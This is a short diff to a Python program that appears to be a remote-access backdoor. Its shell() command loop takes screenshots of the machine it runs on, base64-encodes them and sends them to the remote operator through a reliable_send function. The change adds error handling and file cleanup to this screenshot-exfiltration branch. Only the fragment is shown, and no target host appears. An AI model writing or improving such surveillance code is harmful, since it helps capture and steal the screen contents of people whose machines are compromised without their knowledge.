@@ -151,10 +151,15 @@ def shell():
 				reliable_send("[!] Failed To Start!")
 
 		elif command[:10] == "screenshot":
-			screenshot()
-			sc = open("monitor-1.png","rb")
-			reliable_send(base64.b64encode(sc.read()))
-			os.remove("monitor-1.png")
+			try:
+				screenshot()
+				sc = open("monitor-1.png","rb")
+				reliable_send(base64.b64encode(sc.read()))
+				sc.close()
+			except:
+				reliable_send("[!] Failed To Take Screenshot")
+			finally:
+				os.remove("monitor-1.png")
 
 		elif command[:5] == "check":
 			try:
